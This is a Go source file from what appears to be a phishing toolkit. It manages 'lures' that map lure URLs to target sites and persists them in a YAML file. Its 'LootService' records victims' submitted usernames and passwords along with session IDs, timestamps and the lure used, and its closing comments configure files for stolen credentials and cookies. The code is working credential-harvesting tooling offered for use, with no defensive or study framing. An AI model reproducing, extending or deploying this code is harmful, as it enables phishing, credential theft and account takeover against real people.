package main

import (
	"os"
	"sort"
	"sync"
	"time"

	"github.com/gofiber/fiber/v2"
	"go.uber.org/multierr"
	"gopkg.in/yaml.v3"
)

type APILure struct {
	LureURL   string `json:"lure_url" yaml:"lure_url" validate:"required,uri"`
	TargetURL string `json:"target_url" yaml:"target_url" validate:"required,url"`
	Name      string `json:"name" yaml:"name"`
}

type LureService interface {
	ExistsByURL(lureURL string) (bool, error)
	Add(lure *APILure) error
	DeleteByURL(lureURL string) error
	GetAll() ([]*APILure, error)
}

type ByteSource interface {
	ReadAll() ([]byte, error)
	WriteAll(p []byte) error
}

func NewLureService(source ByteSource) (LureService, error) {
	data, err := source.ReadAll()
	if err != nil {
		return nil, err
	}
	luresMap, err := parseLuresConfig(data)
	if err != nil {
		return nil, err
	}
	return &lureService{luresMap: luresMap, source: source}, nil
}

func parseLuresConfig(data []byte) (mp map[string]*APILure, err error) {
	var doc struct {
		Lures []*APILure `yaml:"lures"`
	}
	if err = yaml.Unmarshal(data, &doc); err != nil {
		return
	}
	mp = make(map[string]*APILure)
	for _, lure := range doc.Lures {
		mp[lure.LureURL] = lure
	}
	return
}

type lureService struct {
	mu       sync.RWMutex
	source   ByteSource
	luresMap map[string]*APILure
}

func (s *lureService) ExistsByURL(url string) (bool, error) {
	s.mu.RLock()
	defer s.mu.RUnlock()
	_, exists := s.luresMap[url]
	return exists, nil
}

func (s *lureService) Add(lure *APILure) error {
	if err := validate.Struct(lure); err != nil {
		return err
	}
	s.mu.Lock()
	defer s.mu.Unlock()
	s.luresMap[lure.LureURL] = lure
	return s.flush()
}

func (s *lureService) DeleteByURL(lureURL string) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	delete(s.luresMap, lureURL)
	return s.flush()
}

func (s *lureService) GetAll() ([]*APILure, error) {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.getAll(), nil
}

func (s *lureService) flush() error {
	values := s.getAll()
	data, err := yaml.Marshal(map[string]interface{}{
		"lures": values,
	})
	return multierr.Append(err, s.source.WriteAll(data))
}

func (s *lureService) getAll() []*APILure {
	lures := make([]*APILure, 0, len(s.luresMap))
	for _, v := range s.luresMap {
		lures = append(lures, v)
	}
	sort.Slice(lures, func(i, j int) bool {
		return lures[i].Name < lures[j].Name
	})
	return lures
}

type FileByteSource struct {
	filename string
}

func (s *FileByteSource) ReadAll() ([]byte, error) {
	if _, err := os.Stat(s.filename); err != nil {
		return nil, nil
	}
	return os.ReadFile(s.filename)
}

//nolint:gosec
func (s *FileByteSource) WriteAll(p []byte) error {
	tmpPath := s.filename + ".tmp"
	if err := os.WriteFile(tmpPath, p, 0644); err != nil {
		return err
	}
	// Atomic operation on most filesystems
	return os.Rename(tmpPath, s.filename)
}

type APILoginInfo struct {
	Username string `json:"username"`
	Password string `json:"password"`
}

type LootService interface {
	SaveCreds(c *fiber.Ctx, info *APILoginInfo) error
}

func NewLootService(repo LootRepository) LootService {
	return &lootService{repo}
}

type lootService struct {
	repo LootRepository
}

func (s *lootService) SaveCreds(c *fiber.Ctx, info *APILoginInfo) error {
	sess := getSession(c)
	lureURL := sess.Get("lureURL").(string)
	dbInfo := &DBLoginInfo{
		Username:  info.Username,
		Password:  info.Password,
		Date:      time.Now().UTC(),
		SessionID: sess.ID(),
		LureURL:   lureURL,
	}
	return s.repo.SaveCreds(dbInfo)
}

// DB_TYPE = file / redis
// DB_URL =
// CREDS_FILE = creds.jsonl
// COOKIES_FILE = cookies.jsonl
